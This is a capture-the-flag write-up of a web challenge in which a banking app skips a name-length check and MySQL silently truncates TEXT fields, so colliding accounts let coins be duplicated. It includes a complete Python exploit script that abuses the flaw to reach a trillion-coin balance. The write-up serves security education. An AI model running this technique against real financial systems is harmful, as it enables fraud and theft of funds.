# Trillion Bank - Web Challenge
**Points:** Not specified  
**Author:** Arkark_  
**Solves:** 82

## Challenge Description
A web challenge involving a banking system where you need to accumulate a trillion coins to get the flag.

## Overview
The challenge provides a simple banking application with three main endpoints:
- `/api/register` - For user registration
- `/api/me` - To check user balance
- `/api/transfer` - To transfer money between users

The goal is to achieve a balance of 1 trillion (1,000,000,000,000) to receive the flag.

## Initial Analysis

### Key Files
1. **Dockerfile & Docker Compose**
   - Standard Node.js setup with MySQL database
   - Flag is passed as an environment variable

2. **Database Schema (db.js)**
```sql
CREATE TABLE users (
  id INT AUTO_INCREMENT NOT NULL,
  name TEXT NOT NULL,
  balance BIGINT NOT NULL,
  PRIMARY KEY (id)
)
```

3. **Main Application (index.js)**
   - Implements user registration
   - Balance checking
   - Money transfer functionality
   - Flag is revealed when balance reaches 1 trillion

## The Vulnerability
The vulnerability lies in the combination of two factors:

1. **No Character Limit in Registration**
```javascript
app.post("/api/register", async (req, res) => {
  const name = String(req.body.name);
  if (!/^[a-z0-9]+$/.test(name)) {
    res.status(400).send({ msg: "Invalid name" });
    return;
  }
  // No length check!
});
```

2. **MySQL TEXT Field Limitation**
   - TEXT fields in MySQL have a maximum length of 65,535 bytes
   - Longer strings get silently truncated

## The Exploit
The vulnerability can be exploited by:

1. Creating multiple users with names longer than 65,535 bytes
2. Adding different characters at the end (after the truncation point)
3. These users will appear different in the application logic but reference the same database record
4. Using this to transfer money between accounts repeatedly

### Exploit Script
```python
import os
import random
import string
import httpx

BASE_URL = f"http://{os.getenv('SECCON_HOST', 'localhost')}:{os.getenv('SECCON_PORT', '3000')}"

# Create base name of 65,535 characters
root_name = "".join(random.choices(string.ascii_lowercase, k=65535))
res = httpx.post(f"{BASE_URL}/api/register", json={"name": root_name})
assert res.status_code == 200

# Create two users with the same truncated name
names = [root_name + "0", root_name + "1"]
balances = [10, 10]
clients = [
    httpx.Client(base_url=BASE_URL),
    httpx.Client(base_url=BASE_URL),
]

for i in range(2):
    res = clients[i].post("/api/register", json={"name": names[i]})
    assert res.status_code == 200, res.json()

def transfer(sender_id: int):
    recipient_id = sender_id ^ 1
    res = clients[sender_id].post(
        "/api/transfer",
        json={"recipientName": root_name, "amount": balances[sender_id]},
    )
    assert res.status_code == 200, res.json()
    balances[recipient_id] += balances[sender_id]

# Keep transferring until we reach 1 trillion
while balances[0] < 1_000_000_000_000:
    for i in range(2):
        transfer(i)
    print(balances)  # Follows Fibonacci sequence

# Get the flag
res = clients[0].get("/api/me")
assert res.status_code == 200
print(res.json()["flag"])
```

## Key Takeaways
1. Always validate input length, especially when dealing with database text fields
2. Be aware of database field limitations and their truncation behavior
3. Consider how truncation might affect application logic
4. Test edge cases with maximum field lengths

## Flag
*Flag not provided in the original content*